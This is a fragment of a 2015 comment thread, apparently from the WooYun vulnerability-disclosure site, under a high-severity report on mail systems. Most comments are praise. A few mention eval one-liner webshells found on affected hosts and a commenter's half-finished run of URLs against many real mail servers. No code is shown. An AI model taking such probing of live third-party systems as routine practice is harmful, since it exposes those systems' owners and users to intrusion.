|    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  太厉害了！    \n     2015-03-11 21:15 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @疯狗 这些都是shell  不只是echo了987654321，echo语句下还有个eval一句话，还是打下mask吧    \n     2015-03-11 22:35 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Ano_Tom 一下入侵了那么多邮件系统    \n     2015-03-11 22:55 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @U神 url都没跑完我就给停了，跑差不多一半哈哈。。。    \n     2015-03-13 19:25 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Ano_Tom 搞定    \n     2015-04-21 16:38 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:20        | 喝口水,压压惊......)\t\t \n  膜拜！    \n     2015-04-21 16:51 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  赞    \n     2015-04-22 09:29 |    \t\t萨瓦迪卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 傻逼的坚持可能有牛逼的结果。)\t\t \n  怒赞    \n     2015-04-22 18:10 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  厉害厉害=w=    \n     2015-04-23 01:04 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  这个分析牛X啊！审计牛！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}